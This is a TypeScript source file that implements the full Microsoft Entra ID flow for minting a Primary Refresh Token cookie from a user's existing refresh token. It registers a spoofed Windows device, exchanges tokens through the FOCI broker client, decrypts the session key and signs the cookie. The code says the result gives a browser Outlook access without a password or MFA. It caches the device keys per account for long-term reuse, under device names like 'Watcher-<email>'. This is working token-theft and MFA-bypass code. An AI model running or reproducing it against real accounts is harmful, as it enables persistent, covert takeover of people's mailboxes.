/**
 * Primary Refresh Token (PRT) cookie minting for Microsoft Entra ID.
 *
 * Implements the device-registration + session-key + JWT-mint flow that the
 * Windows AAD broker (and tools like roadtx / AADInternals) use to produce
 * a `x-ms-RefreshTokenCredential` cookie. Pasting this cookie on
 * `login.microsoftonline.com` allows AAD to silently issue ESTSAUTH
 * cookies for the destination browser session — i.e. the user is signed
 * into OWA in any real browser without password / MFA.
 *
 * High-level flow:
 *
 *   1. Acquire a "device registration" access token from the user's
 *      existing refresh token (resource =
 *      urn:ms-drs:enterpriseregistration.windows.net).
 *   2. Generate an RSA-2048 keypair locally and a self-signed PKCS#10 CSR.
 *   3. POST to https://enterpriseregistration.windows.net/EnrollmentServer/device/?api-version=1.0
 *      with the DRS token + CSR. AAD returns a device certificate (issued
 *      by "MS-Organization-Access") + tenant_id + device_id.
 *   4. Use the device cert to authenticate a /oauth2/token call with
 *      grant_type=srv_challenge. AAD returns:
 *         - session_key_jwe  : 32-byte session key wrapped via RSA-OAEP-SHA1
 *                              with the device cert public key.
 *         - id_token         : informational
 *   5. Decrypt session_key_jwe with the device private key.
 *   6. Mint the PRT cookie:
 *        - 24-byte random context nonce
 *        - derive sign key from session_key via SP800-108 KDF
 *          (label = "AzureAD-SecureConversation")
 *        - JWT header  = { alg: "HS256", ctx: base64url(nonce) }
 *        - JWT body    = { refresh_token, is_primary: "true",
 *                          request_nonce, iat }
 *        - HMAC-SHA256 sign with the derived key
 *
 * Persistence: device cert + private key + session key are cached
 * encrypted on the account (auth.prtRegistrationEncrypted) so subsequent
 * mints are instant — no further DRS calls until the device cert
 * expires (~10 years) or the session key is rotated.
 */

import crypto from 'crypto';
import forge from 'node-forge';
import type { TokenRefreshResult } from './microsoftOAuthRefresh';
import { refreshMicrosoftToken } from './microsoftOAuthRefresh';

// AAD's well-known Device Registration Service (DRS) resource. The token
// we mint here is the one DRS accepts for /EnrollmentServer/device/.
const DRS_RESOURCE = 'urn:ms-drs:enterpriseregistration.windows.net';
// The "Microsoft Authentication Broker" client. This is the FOCI client
// that mints PRTs on real Windows devices and is what roadtx uses too.
// FOCI = Family of Client IDs: any FOCI refresh token can be redeemed at
// any other FOCI client, including this one.
const BROKER_CLIENT_ID = '29d9ed98-a469-4536-ade2-f981bc1d605e';
// Secure Conversation label used when deriving the signing key from the
// session key (matches AAD's KDF on the verification side).
const KDF_LABEL = Buffer.from('AzureAD-SecureConversation', 'utf8');

// ---------------------------------------------------------------------------
// Stored shape (encrypted on the account as auth.prtRegistrationEncrypted)
// ---------------------------------------------------------------------------

export interface PrtRegistration {
  /** PEM-encoded RSA private key for the device. */
  privateKeyPem: string;
  /** PEM-encoded device certificate AAD issued. */
  deviceCertPem: string;
  /** Tenant ID returned by DRS (GUID). */
  tenantId: string;
  /** Device ID AAD assigned to the registration (GUID). */
  deviceId: string;
  /** Session key (raw 32 bytes) base64-encoded. Refreshed by srv_challenge. */
  sessionKeyB64: string;
  /** ISO timestamp of the most recent srv_challenge. */
  sessionKeyAcquiredAt: string;
  /** ISO timestamp of the original registration. */
  registeredAt: string;
}

// ---------------------------------------------------------------------------
// Step 1 — DRS access token from the user's refresh token
// ---------------------------------------------------------------------------

async function acquireDrsAccessToken(
  clientId: string,
  authorityEndpoint: string,
  refreshToken: string
): Promise<TokenRefreshResult> {
  // We use scopeType='ews' here as a dummy because refreshMicrosoftToken's
  // internal heuristics route Office tokens through the v2 endpoint with
  // .default scope. The `resource` parameter is what actually matters for
  // DRS — AAD honours it on the v1 path. If the v2 path is used, AAD will
  // map the resource to the correct .default scope automatically.
  const r = await refreshMicrosoftToken(
    clientId,
    authorityEndpoint,
    refreshToken,
    'ews',
    DRS_RESOURCE
  );
  if (!r.accessToken) throw new Error('Could not acquire DRS access token (empty response)');
  return r;
}

// ---------------------------------------------------------------------------
// Step 2 — RSA-2048 keypair + PKCS#10 CSR (self-signed)
// ---------------------------------------------------------------------------

interface CsrBundle {
  /** PEM-encoded private key. */
  privateKeyPem: string;
  /** Base64-encoded PKCS#10 CertificateRequest (no PEM headers). */
  csrB64: string;
  /** node-forge keypair (kept for downstream use in the same call). */
  keypair: forge.pki.rsa.KeyPair;
  /** Base64-encoded BCRYPT_RSAKEY_BLOB of the public key (TransportKey). */
  transportKeyB64: string;
}

/**
 * Build a BCRYPT_RSAKEY_BLOB (the Windows binary RSA public-key format AAD
 * DRS expects in the TransportKey field).
 *
 * Layout (little-endian):
 *   ULONG Magic        // 'RSA1' (0x31415352) for public key
 *   ULONG BitLength    // e.g. 2048
 *   ULONG cbPublicExp  // length of public exponent in bytes
 *   ULONG cbModulus    // length of modulus in bytes
 *   ULONG cbPrime1     // 0 for public key
 *   ULONG cbPrime2     // 0 for public key
 *   BYTE  PublicExponent[cbPublicExp]   // big-endian
 *   BYTE  Modulus[cbModulus]            // big-endian
 */
function buildBcryptRsaPubKeyBlob(pubKey: forge.pki.rsa.PublicKey): Buffer {
  // forge stores n / e as BigInteger; convert to big-endian byte arrays.
  const modulusHex = pubKey.n.toString(16);
  const modulusEvenHex = modulusHex.length % 2 === 0 ? modulusHex : '0' + modulusHex;
  const modulus = Buffer.from(modulusEvenHex, 'hex');
  const expHex = pubKey.e.toString(16);
  const expEvenHex = expHex.length % 2 === 0 ? expHex : '0' + expHex;
  const exponent = Buffer.from(expEvenHex, 'hex');

  const header = Buffer.alloc(24);
  header.writeUInt32LE(0x31415352, 0); // 'RSA1'
  header.writeUInt32LE(modulus.length * 8, 4); // BitLength
  header.writeUInt32LE(exponent.length, 8); // cbPublicExp
  header.writeUInt32LE(modulus.length, 12); // cbModulus
  header.writeUInt32LE(0, 16); // cbPrime1
  header.writeUInt32LE(0, 20); // cbPrime2
  return Buffer.concat([header, exponent, modulus]);
}

function generateRsaCsr(commonName: string): CsrBundle {
  const keypair = forge.pki.rsa.generateKeyPair({ bits: 2048, e: 0x10001 });
  const csr = forge.pki.createCertificationRequest();
  csr.publicKey = keypair.publicKey;
  csr.setSubject([{ name: 'commonName', value: commonName }]);
  csr.sign(keypair.privateKey, forge.md.sha256.create());
  // AAD wants the CSR DER bytes base64'd, no PEM banner.
  const der = forge.asn1.toDer(forge.pki.certificationRequestToAsn1(csr)).getBytes();
  const csrB64 = forge.util.encode64(der);
  const privateKeyPem = forge.pki.privateKeyToPem(keypair.privateKey);
  const transportKeyBlob = buildBcryptRsaPubKeyBlob(keypair.publicKey);
  const transportKeyB64 = transportKeyBlob.toString('base64');
  return { privateKeyPem, csrB64, keypair, transportKeyB64 };
}

// ---------------------------------------------------------------------------
// Step 3 — Register the device with DRS
// ---------------------------------------------------------------------------

interface DrsRegisterResult {
  /** PEM-encoded device certificate AAD issued. */
  deviceCertPem: string;
  /** Tenant ID (GUID), extracted from the cert subject. */
  tenantId: string;
  /** Device ID AAD assigned to the registration (GUID), extracted from cert subject. */
  deviceId: string;
}

/** Headers AAD's DRS endpoint expects from a Windows-style enrollment client.
 *  The User-Agent is sniffed by AAD and unrecognised values get rejected
 *  with InvalidParameter / 400 errors that don't mention the actual cause. */
function drsHeaders(bearer: string): Record<string, string> {
  return {
    'Content-Type': 'application/json',
    Authorization: `Bearer ${bearer}`,
    'User-Agent': 'Dsreg/10.0 (Windows 10.0.19044.1466)',
    'ocp-adrs-client-name': 'Dsreg',
    'ocp-adrs-client-version': '10.0.19044.1466',
    Accept: 'application/json',
  };
}

/** Pull tenant/device GUIDs out of the issued cert's Subject CN/OU.
 *  Microsoft DRS encodes:   CN=<deviceId>, OU=<tenantId>, DC=...           */
function extractIdsFromCertSubject(cert: forge.pki.Certificate): { deviceId: string; tenantId: string } {
  let deviceId = '';
  let tenantId = '';
  for (const attr of cert.subject.attributes) {
    const name = (attr.shortName || attr.name || '').toString();
    const value = String(attr.value || '');
    if (name === 'CN' || name === 'commonName') deviceId = value;
    else if (name === 'OU' || name === 'organizationalUnitName') tenantId = value;
  }
  return { deviceId, tenantId };
}

async function registerDeviceWithDrs(
  drsAccessToken: string,
  csrB64: string,
  transportKeyB64: string,
  deviceDisplayName: string
): Promise<DrsRegisterResult> {
  // API 2.0 is the version every modern AAD broker implementation uses;
  // 1.0 silently drops fields and returns InvalidParameter even when the
  // body is otherwise correct.
  const url = 'https://enterpriseregistration.windows.net/EnrollmentServer/device/?api-version=2.0';
  const body = {
    CertificateRequest: { Type: 'pkcs10', Data: csrB64 },
    TransportKey: transportKeyB64,
    // DeviceType=Windows is the only value DRS routes through the v2
    // pipeline; macOS / iOS go through different endpoints and will
    // reject this payload shape.
    DeviceType: 'Windows',
    OSVersion: '10.0.19044.1466',
    DeviceDisplayName: deviceDisplayName,
    // JoinType=4 = Workplace Join (BYO device). Preferred over 0 (AAD
    // Join) which often requires admin consent on managed tenants.
    JoinType: 4,
    AikCertificate: '',
    Attributes: { ReuseDevice: 'true', ReturnClientSid: 'true' },
  };
  const res = await fetch(url, {
    method: 'POST',
    headers: drsHeaders(drsAccessToken),
    body: JSON.stringify(body),
  });
  if (!res.ok) {
    const text = await res.text();
    throw new Error(
      `DRS device registration failed (${res.status}): ${text.substring(0, 800)}`
    );
  }
  const data = (await res.json()) as any;
  // AAD v2 returns the device certificate base64-encoded under
  // "Certificate.RawBody". Older v1 callers see "Certificate.Data".
  const certB64: string | undefined = data?.Certificate?.RawBody || data?.Certificate?.Data;
  if (!certB64) {
    throw new Error(
      `DRS response missing Certificate.RawBody (keys: ${Object.keys(data || {}).join(', ')})`
    );
  }
  // Try DER → cert; fall back to PKCS#7 SignedData container if needed.
  let cert: forge.pki.Certificate;
  try {
    const certBytes = forge.util.decode64(certB64);
    const asn1 = forge.asn1.fromDer(certBytes);
    cert = forge.pki.certificateFromAsn1(asn1);
  } catch {
    const p7 = forge.pkcs7.messageFromAsn1(forge.asn1.fromDer(forge.util.decode64(certB64)));
    const certs = (p7 as any).certificates as forge.pki.Certificate[];
    if (!certs || !certs.length) throw new Error('DRS PKCS#7 contained no certificates');
    cert = certs[0];
  }
  const deviceCertPem = forge.pki.certificateToPem(cert);

  // The issued cert encodes tenant/device GUIDs in its Subject; this is
  // the canonical source AAD uses (the JSON envelope is informational).
  const fromSubject = extractIdsFromCertSubject(cert);
  const tenantId =
    fromSubject.tenantId ||
    data?.User?.DirectoryTenantId ||
    data?.TenantId ||
    '';
  const deviceId =
    fromSubject.deviceId ||
    data?.Device?.DeviceId ||
    data?.DeviceId ||
    '';
  if (!tenantId || !deviceId) {
    throw new Error(
      `DRS response did not yield tenant/device IDs (cert subject CN=${fromSubject.deviceId || '?'}, OU=${fromSubject.tenantId || '?'})`
    );
  }
  return { deviceCertPem, tenantId, deviceId };
}

// ---------------------------------------------------------------------------
// Step 4 + 5 — srv_challenge → session key
// ---------------------------------------------------------------------------

async function fetchAadNonce(authority: string): Promise<string> {
  const url = `https://login.microsoftonline.com/${encodeURIComponent(authority)}/oauth2/token`;
  const res = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({ grant_type: 'srv_challenge' }).toString(),
  });
  // AAD returns 200 with { Nonce: "..." } even for srv_challenge probes.
  if (!res.ok) {
    const text = await res.text();
    throw new Error(`Could not fetch AAD nonce (${res.status}): ${text.substring(0, 400)}`);
  }
  const data = (await res.json()) as any;
  if (!data?.Nonce) throw new Error('AAD nonce response missing Nonce field');
  return String(data.Nonce);
}

function buildClientAssertionJwt(
  refreshToken: string,
  nonce: string,
  privateKeyPem: string,
  deviceCertPem: string
): string {
  // x5c header lets AAD verify our signature against the device cert it
  // just issued (so the chain is: AAD trusts itself → trusts the device
  // cert → trusts the assertion JWT).
  const certDer = forge.asn1
    .toDer(forge.pki.certificateToAsn1(forge.pki.certificateFromPem(deviceCertPem)))
    .getBytes();
  const x5c = forge.util.encode64(certDer);
  const header = {
    alg: 'RS256',
    typ: 'JWT',
    x5c: [x5c],
  };
  const body = {
    grant_type: 'refresh_token',
    refresh_token: refreshToken,
    request_nonce: nonce,
    scope: 'openid aza ugs',
    win_ver: '10.0.19041.1.amd64fre.vb_release.191206-1406',
  };
  const headerB64 = base64url(Buffer.from(JSON.stringify(header), 'utf8'));
  const bodyB64 = base64url(Buffer.from(JSON.stringify(body), 'utf8'));
  const signingInput = `${headerB64}.${bodyB64}`;
  const signature = crypto.sign('RSA-SHA256', Buffer.from(signingInput, 'ascii'), {
    key: privateKeyPem,
    padding: crypto.constants.RSA_PKCS1_PADDING,
  });
  return `${signingInput}.${base64url(signature)}`;
}

interface SrvChallengeResult {
  /** Raw 32-byte session key (decrypted from the JWE AAD returned). */
  sessionKey: Buffer;
}

async function srvChallenge(
  authority: string,
  refreshToken: string,
  privateKeyPem: string,
  deviceCertPem: string
): Promise<SrvChallengeResult> {
  const nonce = await fetchAadNonce(authority);
  const assertion = buildClientAssertionJwt(refreshToken, nonce, privateKeyPem, deviceCertPem);
  const url = `https://login.microsoftonline.com/${encodeURIComponent(authority)}/oauth2/token`;
  const body = new URLSearchParams({
    windows_api_version: '2.0',
    grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
    request: assertion,
    client_info: '1',
  });
  const res = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: body.toString(),
  });
  if (!res.ok) {
    const text = await res.text();
    throw new Error(`srv_challenge failed (${res.status}): ${text.substring(0, 600)}`);
  }
  const data = (await res.json()) as any;
  // AAD returns session_key_jwe in compact JWE format:
  //   header.encryptedKey.iv.ciphertext.tag
  const jwe: string | undefined = data?.session_key_jwe;
  if (!jwe) throw new Error(`srv_challenge response missing session_key_jwe (keys: ${Object.keys(data).join(', ')})`);
  const parts = jwe.split('.');
  if (parts.length !== 5) {
    throw new Error(`session_key_jwe has ${parts.length} segments, expected 5`);
  }
  const [, encryptedKeyB64, ivB64, ciphertextB64, tagB64] = parts;
  // Step 5: RSA-OAEP-SHA1 unwrap the CEK with our device private key.
  const cek = crypto.privateDecrypt(
    {
      key: privateKeyPem,
      padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
      oaepHash: 'sha1',
    },
    Buffer.from(encryptedKeyB64, 'base64')
  );
  // Decrypt the session key body with AES-256-GCM using cek.
  const iv = Buffer.from(ivB64, 'base64');
  const ciphertext = Buffer.from(ciphertextB64, 'base64');
  const authTag = Buffer.from(tagB64, 'base64');
  const decipher = crypto.createDecipheriv('aes-256-gcm', cek, iv);
  decipher.setAuthTag(authTag);
  const sessionKey = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
  if (sessionKey.length !== 32) {
    throw new Error(`Decrypted session key wrong length: ${sessionKey.length} (expected 32)`);
  }
  return { sessionKey };
}

// ---------------------------------------------------------------------------
// Step 6 — Mint the PRT cookie
// ---------------------------------------------------------------------------

/**
 * NIST SP800-108 KDF in counter mode with HMAC-SHA256 PRF.
 *   K(i) = HMAC(KI, [i]_32 || Label || 0x00 || Context || [L]_32)
 * AAD always uses i=1 and L=256 bits; we collect K(1) directly.
 */
function sp800108DeriveKey(sessionKey: Buffer, ctx: Buffer): Buffer {
  const counter = Buffer.from([0x00, 0x00, 0x00, 0x01]);
  const lenBits = Buffer.from([0x00, 0x00, 0x01, 0x00]); // 256 bits
  const data = Buffer.concat([counter, KDF_LABEL, Buffer.from([0x00]), ctx, lenBits]);
  return crypto.createHmac('sha256', sessionKey).update(data).digest();
}

export interface MintedPrtCookie {
  /** Full `x-ms-RefreshTokenCredential` JWT value. */
  cookie: string;
  /** ISO timestamp of when this cookie was minted. */
  mintedAt: string;
  /** ISO timestamp the cookie should be considered stale (24h is safe). */
  expiresAt: string;
}

export async function fetchAadNonceForPrt(authority: string = 'common'): Promise<string> {
  return fetchAadNonce(authority);
}

export function mintPrtCookie(
  registration: PrtRegistration,
  refreshToken: string,
  requestNonce: string
): MintedPrtCookie {
  const sessionKey = Buffer.from(registration.sessionKeyB64, 'base64');
  if (sessionKey.length !== 32) {
    throw new Error(`Stored session key has wrong length: ${sessionKey.length}`);
  }
  const ctx = crypto.randomBytes(24);
  const signKey = sp800108DeriveKey(sessionKey, ctx);
  const header = {
    alg: 'HS256',
    typ: 'JWT',
    ctx: base64url(ctx),
  };
  const iat = Math.floor(Date.now() / 1000);
  const body = {
    refresh_token: refreshToken,
    is_primary: 'true',
    request_nonce: requestNonce,
    iat,
  };
  const headerB64 = base64url(Buffer.from(JSON.stringify(header), 'utf8'));
  const bodyB64 = base64url(Buffer.from(JSON.stringify(body), 'utf8'));
  const signingInput = `${headerB64}.${bodyB64}`;
  const signature = crypto.createHmac('sha256', signKey).update(signingInput).digest();
  const cookie = `${signingInput}.${base64url(signature)}`;
  const mintedAt = new Date(iat * 1000).toISOString();
  const expiresAt = new Date((iat + 24 * 60 * 60) * 1000).toISOString();
  return { cookie, mintedAt, expiresAt };
}

// ---------------------------------------------------------------------------
// One-shot helper: register + srv_challenge → ready-to-mint PrtRegistration
// ---------------------------------------------------------------------------

export interface RegisterDeviceForPrtParams {
  email: string;
  /** Refresh token from a FOCI client (Office, Outlook, broker, etc.). */
  refreshToken: string;
  /** Original token's client ID, e.g. d3590ed6-52b3-4102-aeff-aad2292ab01c. */
  clientId: string;
  /** Tenant or "common". */
  authority: string;
  /** Optional human-readable device name shown in Entra ID Devices list. */
  deviceDisplayName?: string;
}

export async function registerDeviceForPrt(
  params: RegisterDeviceForPrtParams
): Promise<PrtRegistration> {
  const displayName =
    params.deviceDisplayName || `Watcher-${params.email.replace(/[^a-z0-9.-]+/gi, '_')}`;

  // Step 1: DRS access token (uses the user's existing refresh token).
  const drsTok = await acquireDrsAccessToken(
    params.clientId,
    params.authority,
    params.refreshToken
  );

  // Step 2: keypair + CSR.
  const csr = generateRsaCsr(displayName);

  // Step 3: register the device.
  const reg = await registerDeviceWithDrs(
    drsTok.accessToken,
    csr.csrB64,
    csr.transportKeyB64,
    displayName
  );

  // For the srv_challenge call we want a refresh token issued by the
  // broker FOCI client (29d9...) so AAD trusts the assertion. Try to
  // redeem one via the existing FOCI refresh token; if AAD refuses
  // (non-FOCI app), fall back to the original refresh token.
  let brokerRefreshToken = params.refreshToken;
  try {
    const broker = await refreshMicrosoftToken(
      BROKER_CLIENT_ID,
      params.authority,
      params.refreshToken,
      'ews',
      'https://graph.windows.net'
    );
    if (broker.refreshToken) brokerRefreshToken = broker.refreshToken;
  } catch (err) {
    // Non-FOCI tokens (rare for Office clients) — use the original.
    console.warn(
      '[PRT] Broker FOCI redeem failed, using original refresh token:',
      err instanceof Error ? err.message : String(err)
    );
  }

  // Step 4 + 5: srv_challenge → session key.
  const challenge = await srvChallenge(
    params.authority,
    brokerRefreshToken,
    csr.privateKeyPem,
    reg.deviceCertPem
  );

  return {
    privateKeyPem: csr.privateKeyPem,
    deviceCertPem: reg.deviceCertPem,
    tenantId: reg.tenantId,
    deviceId: reg.deviceId,
    sessionKeyB64: challenge.sessionKey.toString('base64'),
    sessionKeyAcquiredAt: new Date().toISOString(),
    registeredAt: new Date().toISOString(),
  };
}

/**
 * Use an existing PrtRegistration to mint a fresh PRT cookie. Re-runs
 * srv_challenge only if the stored session key is older than `staleMs`
 * (default 12 hours). Returns the cookie + the (possibly rotated)
 * registration so the caller can persist it.
 */
export async function mintPrtCookieForAccount(
  registration: PrtRegistration,
  refreshToken: string,
  authority: string,
  staleMs: number = 12 * 60 * 60 * 1000
): Promise<{ cookie: MintedPrtCookie; registration: PrtRegistration }> {
  let reg = registration;
  const acquiredAt = new Date(reg.sessionKeyAcquiredAt).getTime();
  if (Number.isNaN(acquiredAt) || Date.now() - acquiredAt > staleMs) {
    const fresh = await srvChallenge(
      authority,
      refreshToken,
      reg.privateKeyPem,
      reg.deviceCertPem
    );
    reg = {
      ...reg,
      sessionKeyB64: fresh.sessionKey.toString('base64'),
      sessionKeyAcquiredAt: new Date().toISOString(),
    };
  }
  const nonce = await fetchAadNonce(authority);
  const cookie = mintPrtCookie(reg, refreshToken, nonce);
  return { cookie, registration: reg };
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function base64url(buf: Buffer): string {
  return buf.toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/g, '');
}
